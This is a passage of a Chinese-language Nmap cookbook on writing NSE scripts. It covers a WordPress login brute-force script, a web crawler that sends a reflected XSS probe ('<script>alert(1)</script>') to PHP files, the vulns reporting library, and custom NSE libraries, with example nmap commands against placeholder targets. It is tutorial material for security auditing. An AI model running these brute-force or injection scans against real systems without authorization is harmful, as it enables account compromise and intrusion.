1.  创建文件`http-wordpress-brute.nse`并填写信息标签：

```
    description = [[
    performs brute force password auditing against Wordpress CMS/blog installations.

    This script uses the unpwdb and brute libraries to perform password guessing. Any successful guesses arestored using the credentials library.

    Wordpress default uri and form names:
    * Default uri:<code>wp-login.php</code>
    * Default uservar: <code>log</code>
    * Default passvar: <code>pwd</code>
    ]]
    author = "Paulino Calderon <calderon()websec.mx>"
    license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
    categories = {"intrusive", "brute"}
    ```

1.  加载所需的库（Nmap 6.x 格式）：

```
    local brute = require "brute"
    local creds = require "creds"
    local http = require "http"
    local shortport = require "shortport"
    local stdnse = require "stdnse"
    ```

1.  使用暴力引擎的 NSE 脚本需要按照以下方式实现其`Driver`类：

```
    Driver = {
      new = function(self, host, port, options)
      ...
      end,
      check = function(self)
      ...
      end
      login = function(self)
      ...
      end
      connect = function(self)
      ...
      end
      disconnect = function(self)
      ...
      end
    }
    ```

1.  让我们创建与我们的脚本相关的相应函数：

+   `constructor`函数负责读取脚本参数并设置脚本可能需要的任何其他选项：

```
                new = function(self, host, port, options)
                    local o = {}
                    setmetatable(o, self)
                    self.__index = self
                    o.host = stdnse.get_script_args('http-wordpress-brute.hostname') or host
                    o.port = port
                    o.uri = stdnse.get_script_args('http-wordpress-brute.uri') or DEFAULT_WP_URI
                    o.options = options
                    return o
                  end,
        ```

+   `connect`函数可以留空，因为在这种情况下不需要连接到套接字；我们正在对 HTTP 服务执行暴力破解密码审计攻击（库`http`在我们的下一个登录函数中使用时负责打开和关闭必要的套接字）：

```
                 connect = function( self )
                    return true
                  end,
        ```

+   `disconnect`函数也可以在这个脚本中留空：

```
                disconnect = function( self )
                    return true
                  end,
        ```

+   `check`函数用作在我们开始暴力破解密码攻击之前的健全性检查。请注意，这个函数最近被标记为不推荐使用，这些检查将需要在将来的版本中移动到主要部分：

```
                  check = function( self )
                    local response = http.get( self.host, self.port, self.uri )
                    stdnse.print_debug(1, "HTTP GET %s%s", stdnse.get_hostname(self.host),self.uri)
                    -- Check if password field is there
                    if ( response.status == 200 and response.body:match('type=[\'"]password[\'"]')) then
                      stdnse.print_debug(1, "Initial check passed. Launching brute force attack")
                      return true
                    else
                      stdnse.print_debug(1, "Initial check failed. Password field wasn't found")
                    end

                    return false
        ```

+   最后是`login`函数：

```
                 login = function( self, username, password )
                    -- Note the no_cache directive
                    stdnse.print_debug(2, "HTTP POST %s%s\n", self.host, self.uri)
                    local response = http.post( self.host, self.port, self.uri, { no_cache = true }, nil, { [self.options.uservar] = username, [self.options.passvar] = password } )
                        -- This redirect is taking us to /wp-admin
                    if response.status == 302 then
                      local c = creds.Credentials:new( SCRIPT_NAME, self.host, self.port )
                      c:add(username, password, creds.State.VALID )
                      return true, brute.Account:new( username, password, "OPEN")
                    end

                    return false, brute.Error:new( "Incorrect password" )
                  end,
        ```

1.  我们留下了代码的主要部分来初始化、配置和启动暴力引擎：

```
            action = function( host, port )
              local status, result, engine
              local uservar = stdnse.get_script_args('http-wordpress-brute.uservar') or DEFAULT_WP_USERVAR
              local passvar = stdnse.get_script_args('http-wordpress-brute.passvar') or DEFAULT_WP_PASSVAR
              local thread_num = stdnse.get_script_args("http-wordpress-brute.threads") or DEFAULT_THREAD_NUM

              engine = brute.Engine:new( Driver, host, port, { uservar = uservar, passvar = passvar } )
              engine:setMaxThreads(thread_num)
              engine.options.script_name = SCRIPT_NAME
              status, result = engine:start()

              return result
            end
    ```

## 工作原理...

库`brute`为开发人员提供了一个有组织的接口，用于编写执行暴力破解密码审计的 NSE 脚本。暴力脚本的数量已经大大增加，目前 NSE 可以对许多应用程序、服务和协议进行暴力破解攻击：Apache Jserv、BackOrifice、Joomla、Citrix PN Web Agent XML、CVS、DNS、Domino Console、Dpap、IBM DB2、Wordpress、FTP、HTTP、Asterisk IAX2、IMAP、Informix Dynamic Server、IRC、iSCSI、LDAP、Couchbase Membase、RPA Tech Mobile Mouse、Metasploit msgrpc、Metasploit XMLRPC、MongoDB、MSSQL、MySQL、Nessus daemon、Netbus、Nexpose、Nping Echo、OpenVAS、Oracle、PCAnywhere、PostgreSQL、POP3、redis、rlogin、rsync、rpcap、rtsp、SIP、Samba、SMTP、SNMP、SOCKS、SVN、Telnet、VMWare Auth daemon 和 XMPP。

要使用这个库，我们需要创建一个`Driver`类并将其作为参数传递给暴力引擎。每次登录尝试都会创建这个类的一个新实例：

```
Driver:login = function( self, username, password )
Driver:check = function( self ) [Deprecated]
Driver:connect = function( self )
Driver:disconnect = function( self )
```

在脚本`http-wordpress-brute`中，函数`connect()`和`disconnect()`始终返回`true`，因为事先不需要建立连接。

`login`函数应返回一个布尔值来指示其状态。如果登录尝试成功，它还应返回一个`Account`对象：

```
brute.Account:new( username, password, "OPEN")
```

在这个脚本中，我们还通过使用库`creds`来存储凭据。这允许其他 NSE 脚本访问它们，用户甚至可以根据结果生成额外的报告。

```
local c = creds.Credentials:new( SCRIPT_NAME, self.host, self.port )
      c:add(username, password, creds.State.VALID )
```

## 还有更多...

NSE 库`unpwdb`和`brute`有几个脚本参数，用户可以调整这些参数以进行暴力破解密码审计攻击。

要使用不同的用户名和密码列表，分别设置参数`userdb`和`passdb`：

```
$ nmap -p80 --script http-wordpress-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt <target>

```

要在找到一个有效帐户后退出，请使用参数`brute.firstOnly`：

```
$ nmap -p80 --script http-wordpress-brute --script-args brute.firstOnly <target>

```

要设置不同的超时限制，请使用参数`unpwd.timelimit`。要无限期运行，将其设置为 0：

```
$ nmap -p80 --script http-wordpress-brute --script-args unpwdb.timelimit=0 <target>
$ nmap -p80 --script http-wordpress-brute --script-args unpwdb.timelimit=60m <target>

```

这些库的官方文档可以在以下网站找到：

+   [`nmap.org/nsedoc/lib/brute.html`](http://nmap.org/nsedoc/lib/brute.html)

+   [`nmap.org/nsedoc/lib/creds.html`](http://nmap.org/nsedoc/lib/creds.html)

+   [`nmap.org/nsedoc/lib/unpwdb.html`](http://nmap.org/nsedoc/lib/unpwdb.html)

### 调试 NSE 脚本

如果发生意外情况，请打开调试以获取更多信息。Nmap 使用`-d`标志进行调试，您可以设置 0 到 9 之间的任何整数：

```
$ nmap -p80 --script http-google-email -d4 <target>

```

### 异常处理

`nmap`库为 NSE 脚本提供了一个异常处理机制，旨在帮助处理网络 I/O 任务。

`nmap`库中的异常处理机制运行正常。我们将要监视异常的代码包装在`nmap.try()`调用内。函数返回的第一个值表示完成状态。如果返回`false`或`nil`，则第二个返回值必须是错误字符串。在成功执行的返回值的其余部分可以设置和使用。由`nmap.new_try()`定义的`catch`函数将在引发异常时执行。

以下示例是脚本`mysql-vuln-cve2012-2122.nse`的代码片段([`nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html`](http://nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html))。在此脚本中，`catch`函数执行一些简单的垃圾收集，如果套接字保持打开状态：

```
local catch = function()  socket:close() end
local try = nmap.new_try(catch)
…
  try( socket:connect(host, port) )
  response = try( mysql.receiveGreeting(socket) )
```

NSE 库`nmap`的官方文档可以在[`nmap.org/nsedoc/lib/nmap.html`](http://nmap.org/nsedoc/lib/nmap.html)找到。

### Brute 模式

`brute`库支持不同的模式，可以改变攻击中使用的组合。可用的模式有：

+   `user`：对于`userdb`中列出的每个用户，将尝试`passdb`中的每个密码

```
    $ nmap --script http-wordpress-brute --script-args brute.mode=user <target>

    ```

+   `pass`：对于`passdb`中列出的每个密码，将尝试`userdb`中的每个用户

```
    $ nmap --script http-wordpress-brute --script-args brute.mode=pass <target>

    ```

+   `creds`：这需要额外的参数`brute.credfile`

```
    $ nmap --script http-wordpress-brute --script-args brute.mode=creds,brute.credfile=./creds.txt <target>

    ```

## 另请参阅

+   *利用 HTTP 请求识别易受攻击的 Trendnet 网络摄像头*配方

+   在第四章中的*审计 Web 服务器*中的*暴力破解 HTTP 身份验证*配方

+   在第四章中的*审计 Web 服务器*中的*Brute-force 密码审计 Wordpress 安装*配方

+   在第四章中的*审计 Web 服务器*中的*Brute-force 密码审计 Joomla 安装*配方

+   *使用 NSE 套接字发送 UDP 有效载荷*配方

+   在第四章中的*审计 Web 服务器*中的*利用 NSE 的路径遍历漏洞*配方

+   *编写暴力破解脚本*配方

+   *使用 Web 爬行库*配方

+   *在 NSE 脚本中正确报告漏洞*配方

+   *编写自己的 NSE 库*配方

# 使用 Web 爬行库

在渗透测试 Web 应用程序时，需要对 Web 服务器中的每个文件进行某些检查。诸如查找遗忘的备份文件之类的任务可能会显示应用程序源代码或数据库密码。 Nmap 脚本引擎支持 Web 爬行，以帮助我们处理需要 Web 服务器上现有文件列表的任务。

这个配方将向您展示如何编写一个 NSE 脚本，该脚本将爬行 Web 服务器，寻找具有`.php`扩展名的文件，并通过变量`$_SERVER["PHP_SELF"]`执行注入测试，以查找反射型跨站脚本漏洞。

## 操作步骤...

一项一些主要安全扫描程序忽略的常见任务是通过变量`$_SERVER["PHP_SELF"]`在 PHP 文件中查找反射型跨站脚本漏洞。在自动化此任务时，Web 爬行库`httpspider`非常方便，如下所示：

1.  创建脚本文件`http-phpself-xss.nse`并填写信息标签：

```
    description=[[
    Crawls a web server and attempts to find PHP files vulnerable to reflected cross site scripting via the variable $_SERVER["PHP_SELF"].

    This script crawls the web server to create a list of PHP files and then sends an attack vector/probe to identify PHP_SELF cross site scripting vulnerabilities.
    PHP_SELF XSS refers to reflected cross site scripting vulnerabilities caused by the lack of sanitation of the variable <code>$_SERVER["PHP_SELF"]</code> in PHP scripts. This variable iscommonly used in php scripts that display forms and when the script file name  is needed.

    Examples of Cross Site Scripting vulnerabilities in the variable $_SERVER[PHP_SELF]:
    *http://www.securityfocus.com/bid/37351
    *http://software-security.sans.org/blog/2011/05/02/spot-vuln-percentage
    *http://websec.ca/advisories/view/xss-vulnerabilities-mantisbt-1.2.x

    The attack vector/probe used is: <code>/'"/><script>alert(1)</script></code>
    ]]
    author = "Paulino Calderon <calderon()websec.mx>"
    license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
    categories = {"fuzzer", "intrusive", "vuln"}
    ```

1.  加载所需的库（Nmap 6.x 格式）：

```
    local http = require 'http'
    local httpspider = require 'httpspider'
    local shortport = require 'shortport'
    local url = require 'url'
    local stdnse = require 'stdnse'
    local vulns = require 'vulns'
    ```

1.  定义脚本应在遇到别名为`shortport.http`的 HTTP 服务器时运行：

```
    portrule = shortport.http
    ```

1.  编写一个函数，该函数将从爬虫接收一个 URI 并发送一个注入探针：

```
    local PHP_SELF_PROBE = '/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E'
    local probes = {}
    local function launch_probe(host, port, uri)
      local probe_response
      --We avoid repeating probes.
      --This is a temp fix since httpspider do not keep track of previously parsed links at the moment.
      if probes[uri] then
        return false
      end

      stdnse.print_debug(1, "%s:HTTP GET %s%s", SCRIPT_NAME, uri, PHP_SELF_PROBE)
      probe_response = http.get(host, port, uri .. PHP_SELF_PROBE)

      --save probe in list to avoid repeating it
      probes[uri] = true

      if check_probe_response(probe_response) then
        return true
      end
      return false
    end
    ```

1.  添加一个函数，用于检查响应主体，以确定 PHP 文件是否易受攻击：

```
    local function check_probe_response(response)
      stdnse.print_debug(3, "Probe response:\n%s", response.body)
      if string.find(response.body, "'\"/><script>alert(1)</script>", 1, true) ~= nil then
        return true
      end
      return false
    end
    ```

1.  在脚本的主要部分，我们将添加读取脚本参数、初始化`http`爬虫、设置漏洞信息，并迭代页面以启动探测（如果找到 PHP 文件）的代码：

```
    action = function(host, port)
      local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/"
      local timeout = stdnse.get_script_args(SCRIPT_NAME..'.timeout') or 10000
      local crawler = httpspider.Crawler:new(host, port, uri, { scriptname = SCRIPT_NAME } )
      crawler:set_timeout(timeout)

      local vuln = {
           title = 'Unsafe use of $_SERVER["PHP_SELF"] in PHP files',
           state = vulns.STATE.NOT_VULN,
           description = [[
    PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.
           ]],
           references = {
               'http://php.net/manual/en/reserved.variables.server.php',
               'https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)'
           }
         }
      local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)

      local vulnpages = {}
      local probed_pages= {}

      while(true) do
        local status, r = crawler:crawl()
        if ( not(status) ) then
          if ( r.err ) then
            return stdnse.format_output(true, "ERROR: %s", r.reason)
          else
            break
          end
        end

        local parsed = url.parse(tostring(r.url))

        --Only work with .php files
        if ( parsed.path and parsed.path:match(".*.php") ) then
            --The following port/scheme code was seen in http-backup-finder and its neat =)
            local host, port = parsed.host, parsed.port
            if ( not(port) ) then
              port = (parsed.scheme == 'https') and 443
              port = port or ((parsed.scheme == 'http') and 80)
            end
            local escaped_link = parsed.path:gsub(" ", "%%20")
            if launch_probe(host,port,escaped_link) then
              table.insert(vulnpages, parsed.scheme..'://'..host..escaped_link..PHP_SELF_PROBE)
            end
          end
      end

      if ( #vulnpages > 0 ) then
        vuln.state = vulns.STATE.EXPLOIT
        vulnpages.name = "Vulnerable files with proof of concept:"
        vuln.extra_info = stdnse.format_output(true, vulnpages)..crawler:getLimitations()
      end

      return vuln_report:make_output(vuln)

    end
    ```

要运行脚本，请使用以下命令：

```
    $ nmap -p80 --script http-phpself-xss.nse <target>

    ```

如果 PHP 文件通过`$_SERVER["PHP_SELF"]`注入易受跨站脚本攻击，输出将类似于这样：

```
    PORT   STATE SERVICE REASON
    80/tcp open  http    syn-ack
     http-phpself-xss:
       VULNERABLE:
       Unsafe use of $_SERVER["PHP_SELF"] in PHP files
         State: VULNERABLE (Exploitable)
         Description:
           PHP files are not handling safely the variable $_SERVER["PHP_SELF"] causing Reflected Cross Site Scripting vulnerabilities.

         Extra information:

       Vulnerable files with proof of concept:
         http://calder0n.com/sillyapp/three.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
         http://calder0n.com/sillyapp/secret/2.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
         http://calder0n.com/sillyapp/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
         http://calder0n.com/sillyapp/secret/1.php/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E
       Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=calder0n.com
         References:
           https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
          http://php.net/manual/en/reserved.variables.server.php
    ```

## 它是如何工作的...

脚本`http-phpself-xss`依赖于库`httpspider`。该库提供了一个返回发现的 URI 迭代器的 Web 爬虫接口。在进行 Web 渗透测试时，该库非常有用，因为它加快了几项测试，否则将不得不手动完成或使用第三方工具。

PHP 为开发人员提供了一个名为`$_SERVER["PHP_SELF"]`的变量，用于检索执行 PHP 脚本的文件名。不幸的是，这是一个可以被用户提供的数据篡改的值，许多开发人员在其脚本中不安全地使用它，导致反射型**跨站脚本**（**XSS**）漏洞。

首先，我们初始化一个 Web 爬虫。我们设置起始路径和超时值：

```
local timeout = stdnse.get_script_args(SCRIPT_NAME..'.timeout') or 10000
local crawler = httpspider.Crawler:new(host, port, uri, { scriptname = SCRIPT_NAME } )
crawler:set_timeout(timeout)
```

Web 爬虫的行为可以通过以下库参数进行修改：

+   `url`：开始爬行的基本 URL。

+   `maxpagecount`：在退出之前要访问的最大页面数。

+   `useheadfornonwebfiles`：当发现二进制文件时，通过使用`HEAD`来节省带宽。未被视为二进制文件的文件列表在`file /nselib/data/http-web-file-extensions.lst`中定义。

+   `noblacklist`：不加载黑名单规则。不建议使用此选项，因为它将下载所有文件，包括二进制文件。

+   `withinhost`：过滤掉不在同一主机上的 URI。

+   `withindomain`：过滤掉不在同一域中的 URI。

我们通过 URI 迭代查找扩展名为`.php`的文件：

```
while(true) do
    local status, r = crawler:crawl()
    local parsed = url.parse(tostring(r.url))
    if ( parsed.path and parsed.path:match(".*.php") ) then
    …
    end
end
```

处理每个扩展名为`.php`的 URI，并使用`http.get()`函数为每个 URI 发送一个注入探测：

```
local PHP_SELF_PROBE = '/%27%22/%3E%3Cscript%3Ealert(1)%3C/script%3E'
probe_response = http.get(host, port, uri .. PHP_SELF_PROBE)
```

`check_probe_response()`函数只是在响应中查找注入的文本，借助`string.find()`的一些帮助：

```
if string.find(response.body, "'\"/><script>alert(1)</script>", 1, true) ~= nil then
    return true
  end
  return false
```

执行后，我们检查存储有漏洞 URI 的表，并将它们报告为额外信息：

```
if ( #vulnpages > 0 ) then
    vuln.state = vulns.STATE.EXPLOIT
    vulnpages.name = "Vulnerable files with proof of concept:"
    vuln.extra_info = stdnse.format_output(true, vulnpages)..crawler:getLimitations()
end

return vuln_report:make_output(vuln)
```

## 还有更多...

建议您包含一条消息，通知用户有关 Web 爬虫使用的设置，因为它可能在完成测试之前退出。函数`crawler:getLimitations()`将返回一个显示爬虫设置的字符串：

```
Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=scanme.nmap.org
```

库`httpspider`的官方文档可以在[`nmap.org/nsedoc/lib/httpspider.html`](http://nmap.org/nsedoc/lib/httpspider.html)找到。

### 调试 NSE 脚本

如果发生意外情况，请打开调试以获取额外信息。Nmap 使用`-d`标志进行调试，您可以设置 0 到 9 之间的任何整数：

```
$ nmap -p80 --script http-google-email -d4 <target>

```

### 通过设置用户代理来设置用户代理

有一些数据包过滤产品会阻止使用 Nmap 的默认 HTTP 用户代理的请求。您可以通过设置参数`http.useragent`来使用不同的用户代理值：

```
$ nmap -p80 --script http-sqli-finder --script-args http.useragent="Mozilla 42" <target>

```

要在您的 NSE 脚本中设置用户代理，可以传递`header`字段：

```
options = {header={}}
options['header']['User-Agent'] = "Mozilla/9.1 (compatible; Windows NT 5.0 build 1420;)"
local req = http.get(host, port, uri, options)
```

### HTTP 管线处理

一些 Web 服务器配置支持在单个数据包中封装多个 HTTP 请求。这可能会加快 NSE HTTP 脚本的执行速度，如果 Web 服务器支持的话，建议使用。默认情况下，`http`库尝试对 40 个请求进行管线处理，并根据网络条件和`Keep-Alive`标头自动调整该数字。

用户需要设置脚本参数`http.pipeline`来调整此值：

```
$ nmap -p80 --script http-methods --script-args http.pipeline=25 <target>

```

要在您的 NSE 脚本中实现 HTTP 管线处理，请使用函数`http.pipeline_add()`和`http.pipeline()`。首先，初始化一个变量来保存请求：

```
local reqs = nil
```

使用`http.pipeline_add()`将请求添加到管道中：

```
reqs = http.pipeline_add('/Trace.axd', nil, reqs)
reqs = http.pipeline_add('/trace.axd', nil, reqs)
reqs = http.pipeline_add('/Web.config.old', nil, reqs)
```

当您添加请求完成后，使用`http.pipeline()`执行管道：

```
local results = http.pipeline(target, 80, reqs)
```

变量结果将包含添加到 HTTP 请求队列的响应对象的数量。要访问它们，您可以简单地遍历对象：

```
for i, req in pairs(results) do
  stdnse.print_debug(1, "Request #%d returned status %d", I, req.status)
end
```

### 异常处理

`nmap`库为设计用于帮助网络 I/O 任务的 NSE 脚本提供了异常处理机制。

`nmap`库的异常处理机制按预期工作。我们将要监视异常的代码包装在`nmap.try()`调用内。函数返回的第一个值表示完成状态。如果返回`false`或`nil`，则第二个返回值必须是错误字符串。在成功执行的其余返回值可以根据需要设置和使用。由`nmap.new_try()`定义的`catch`函数将在引发异常时执行。

以下示例是脚本`mysql-vuln-cve2012-2122.nse`的代码片段（[`nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html`](http://nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html)）。在此脚本中，`catch`函数执行一些简单的垃圾收集，如果套接字保持打开状态：

```
local catch = function()  socket:close() end
local try = nmap.new_try(catch)
…
  try( socket:connect(host, port) )
  response = try( mysql.receiveGreeting(socket) )
```

NSE 库`nmap`的官方文档可以在[`nmap.org/nsedoc/lib/nmap.html`](http://nmap.org/nsedoc/lib/nmap.html)找到。

## 另请参阅

+   识别易受攻击的 Trendnet 网络摄像头的 HTTP 请求的制作

+   通过使用 NSE 套接字发送 UDP 有效载荷的食谱

+   利用路径遍历漏洞与 NSE 的食谱

+   编写暴力脚本的食谱

+   在 NSE 脚本中正确报告漏洞的食谱

+   撰写自己的 NSE 库食谱

# 在 NSE 脚本中正确报告漏洞

Nmap 脚本引擎非常适合检测漏洞，因此 Nmap 已经包含了几个利用脚本。不久之前，每个开发人员都使用自己的标准来报告这些漏洞时要包含的输出。为了解决这个问题并统一输出格式和提供的信息量，引入了`vulns`库。

这个食谱将教你如何通过使用`vulns`库在你的 NSE 脚本中正确报告漏洞。

## 如何做...

在 NSE 中正确报告漏洞的正确方法是通过`vulns`库。让我们回顾一下报告漏洞的过程：

1.  加载`vulns`库（Nmap 6.x 格式）：

```
    local vulns = require "vulns"
    ```

1.  创建`vuln`对象表。特别注意`state`字段：

```
    local vuln = { title = "<TITLE GOES HERE>",
                   state = vulns.STATE.NOT_VULN,
                 references = {"<URL1>", "URL2"},
                   description = [[<DESCRIPTION GOES HERE> ]],
                   IDS = {CVE = "<CVE ID>", BID = "BID ID"},
                   risk_factor = "High/Medium/Low" }
    ```

1.  创建报告对象并报告漏洞：

```
    local vuln_report = new vulns.Report:new(SCRIPT_NAME, host, port)
    return vuln_report:make_output(vuln)
    ```

1.  如果状态设置为指示主机是否易受攻击，Nmap 将包括类似的漏洞报告：

```
    PORT   STATE SERVICE REASON
    80/tcp open  http    syn-ack
     http-vuln-cve2012-1823:
       VULNERABLE:
       PHP-CGI Remote code execution and source code disclosure
         State: VULNERABLE (Exploitable)
         IDs:  CVE:2012-1823
         Description:
           According to PHP's website, "PHP is a widely-used general-purpose
           scripting language that is especially suited for Web development and
           can be embedded into HTML." When PHP is used in a CGI-based setup
           (such as Apache's mod_cgid), the php-cgi receives a processed query
           string parameter as command line arguments which allows command-line
           switches, such as -s, -d or -c to be passed to the php-cgi binary,
           which can be exploited to disclose source code and obtain arbitrary
           code execution.
         Disclosure date: 2012-05-3
         Extra information:
           Proof of Concept:/index.php?-s
         References:
           http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
           http://cve.mitre.org/cgi-bin/cvename.cgi?name=2012-1823
          http://ompldr.org/vZGxxaQ
    ```

## 工作原理...

`vulns`库由 Djalal Harouni 和 Henri Doreau 引入，用于统一执行漏洞检查的 NSE 脚本返回的输出。该库还管理和跟踪已完成的安全检查，这对于希望列出安全检查的用户来说是一个有用的功能，即使目标不易受攻击。

漏洞表可以包含以下字段：

+   `title`：指示漏洞标题的字符串。此字段是必需的。

+   `state`：此字段指示漏洞检查的不同可能状态。此字段是必需的。查看表`vulns.STATE`以获取所有可能的值。

+   `IDS`：存储 CVE 和 BID ID 的字段。它用于自动生成咨询 URL。

+   `risk_factor`：表示风险因素的字符串：`高`/`中`/`低`。

+   `scores`：存储 CVSS 和 CVSSv2 分数的字段。

+   `description`：漏洞描述。

+   `dates`：与此漏洞相关的日期字段。

+   `check_results`：用于存储返回结果的字符串或字符串列表。

+   `exploit_results`：用于存储利用结果的字符串或字符串列表。

+   `extra_info`：用于存储附加信息的字符串或字符串列表。

+   `references`：要包括为引用的 URI 列表。如果设置了 IDS 表，库将自动生成 CVE 和 BID 链接的 URI。

正如您之前看到的，报告 NSE 中的漏洞非常简单。首先，我们创建一个包含所有漏洞信息的表：

```
local vuln = { title = "<TITLE GOES HERE>", state = vulns.STATE.NOT_VULN, ... }
```

要向用户报告，我们需要一个报告对象：

```
local vuln_report = new vulns.Report:new(SCRIPT_NAME, host, port)
```

包含此库的 NSE 脚本中应使用的最后一个函数是`make_output()`。如果发现目标易受攻击，它将生成并显示报告，或者如果没有发现目标易受攻击，则返回`nil`。

```
return vuln_report:make_output(vuln)
```

如果您想学习更多使用此库的 NSE 脚本，请访问[`nmap.org/nsedoc/categories/vuln.html`](http://nmap.org/nsedoc/categories/vuln.html)。请注意，并非所有脚本都使用它，因为该库是最近引入的。

## 还有更多...

您可以告诉 Nmap 通过使用库参数`vulns.showall`报告 NSE 执行的所有漏洞检查：

```
# nmap -sV --script vuln --script-args vulns.showall <target>

```

将显示所有漏洞检查的列表：

```
| http-vuln-cve2011-3192:
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  OSVDB:74721
|     Description:
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       http://nessus.org/plugins/index.php?view=single&id=55976
|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
|       http://osvdb.org/74721
|_      http://seclists.org/fulldisclosure/2011/Aug/175
| http-vuln-cve2011-3368:
|   NOT VULNERABLE:
|   Apache mod_proxy Reverse Proxy Security Bypass
|     State: NOT VULNERABLE
|     IDs:  CVE:CVE-2011-3368  OSVDB:76079
|     References:
|       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3368
|_      http://osvdb.org/76079
```

如果需要更多灵活性，此库还可以与 prerule 和 postrule 操作结合使用。NSE 库`vulns`的在线文档可在[`nmap.org/nsedoc/lib/vulns.html`](http://nmap.org/nsedoc/lib/vulns.html)找到。

### 库 vulns 的漏洞状态

库`vulns`可以标记具有可利用性状态的主机，用于指示 Nmap 脚本引擎是否存在主机中的某些漏洞。

以下是来自`vulns`库的片段，显示了支持的状态和报告中使用的相应字符串消息：

```
STATE_MSG = {
  [STATE.LIKELY_VULN] = 'LIKELY VULNERABLE',
  [STATE.NOT_VULN] = 'NOT VULNERABLE',
  [STATE.VULN] = 'VULNERABLE',
  [STATE.DoS] = 'VULNERABLE (DoS)',
  [STATE.EXPLOIT] = 'VULNERABLE (Exploitable)',
  [bit.bor(STATE.DoS,STATE.VULN)] = 'VUNERABLE (DoS)',
  [bit.bor(STATE.EXPLOIT,STATE.VULN)] = 'VULNERABLE (Exploitable)',
}
```

## 另请参阅

+   *制作 HTTP 请求以识别易受攻击的 Trendnet 网络摄像头*配方

+   *使用 NSE 套接字发送 UDP 负载*配方

+   *利用 NSE 的路径遍历漏洞*配方

+   *编写蛮力脚本*配方

+   *使用 Web 爬虫库*配方

+   *编写您自己的 NSE 库*配方

# 编写您自己的 NSE 库

有时您会意识到您正在编写的代码可以放入库中，以便其他 NSE 脚本重复使用。编写 NSE 库的过程很简单，我们只需要考虑一些特定的事情，比如不要访问其他脚本使用的全局变量。尽管首选 Lua 模块，但 Nmap 脚本引擎还通过 Lua C API 支持 C 模块，以提供额外的性能。

此配方将教您如何创建自己的 Lua NSE 库。

## 如何做...

创建库的过程与编写脚本类似。只需记住您正在使用的变量的范围。让我们创建一个简单的库：

1.  创建一个名为`mylibrary.lua`的新文件，并开始输入您可能需要的所需库：

```
    local math = require "math"
    ```

1.  现在，只需将函数添加到您的库中。我们将创建一个返回经典的`"Hello World!"`消息的函数：

```
    function hello_word()
      return "Hello World!"
    end
    ```

1.  将您的库文件放入`/nselib/`目录中。创建一个新的 NSE 脚本，并在其中添加`require()`调用：

```
    local mylibrary = require "mylibrary"
    ```

1.  从脚本内部执行您的方法。如果无法访问该方法，则可能为函数设置了不正确的范围分配：

```
    mylibrary.hello_world()
    ```

## 它是如何工作的...

LUA NSE 库存储在您配置的数据目录中的`/nselib/`目录中。要创建我们自己的库，我们只需要创建`.lua`文件并将其放在该目录中：

```
--hello.lua
local stdnse = require "stdnse"
function hello(msg, name)
   return stdnse.format("%s %s", msg, name)
end
```

NSE 脚本现在可以导入您的 NSE 库并调用可用的函数：

```
local hello = require "hello"
...
hello.foo()
```

在将其提交到`<nmap-dev@insecure.org>`之前，有必要对您的库进行良好的文档记录，以帮助其他开发人员快速了解您的新库的目的和功能。

## 还有更多...

为了避免错误地覆盖其他脚本使用的全局变量，请包含模块`strict.lua`。该模块将在运行时每次访问或修改未声明的全局变量时提醒您。

### 调试 NSE 脚本

如果发生意外情况，请打开调试以获取更多信息。Nmap 使用`-d`标志进行调试，您可以设置 0 到 9 之间的任何整数：

```
$ nmap -p80 --script http-google-email -d4 <target>

```

### 异常处理

`nmap`库为 NSE 脚本提供了一个异常处理机制，旨在帮助处理网络 I/O 任务。

nmap 库中的异常处理机制按预期工作。我们将要监视异常的代码包装在`nmap.try()`调用中。函数返回的第一个值表示完成状态。如果返回`false`或`nil`，则第二个返回值必须是错误字符串。在成功执行的其余返回值可以根据需要进行设置和使用。当引发异常时，由`nmap.new_try()`定义的`catch`函数将执行。

以下示例是脚本`mysql-vuln-cve2012-2122.nse`的代码片段([`nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html`](http://nmap.org/nsedoc/scripts/mysql-vuln-cve2012-2122.html))。在这个脚本中，`catch`函数执行一些简单的垃圾回收，如果套接字保持打开状态：

```
local catch = function()  socket:close() end
local try = nmap.new_try(catch)
…
  try( socket:connect(host, port) )
  response = try( mysql.receiveGreeting(socket) )
```

NSE 库的官方文档可以在[`nmap.org/nsedoc/lib/nmap.html`](http://nmap.org/nsedoc/lib/nmap.html)找到。

### 在 C 中导入模块

一些包含在 Nmap 脚本引擎中的模块是用 C++或 C 编写的。这些语言提供了增强的性能，在所需任务的关键方面推荐使用。

我们可以通过遵循在以下详细描述的协议，在我们的脚本中使用 Lua C API 中的编译 C 模块：

+   [`www.lua.org/manual/5.2/manual.html#4`](http://www.lua.org/manual/5.2/manual.html#4)

+   [`nmap.org/book/nse-library.html`](http://nmap.org/book/nse-library.html)

## 另请参阅

+   向 Trendnet 网络摄像头发送 HTTP 请求以识别漏洞的方法

+   使用 NSE 套接字发送 UDP 负载的方法

+   利用 NSE 利用路径遍历漏洞的方法

+   编写暴力脚本的方法

+   使用网络爬虫库的方法

+   在 NSE 脚本中正确报告漏洞

# 在 NSE 中使用线程、条件变量和互斥锁

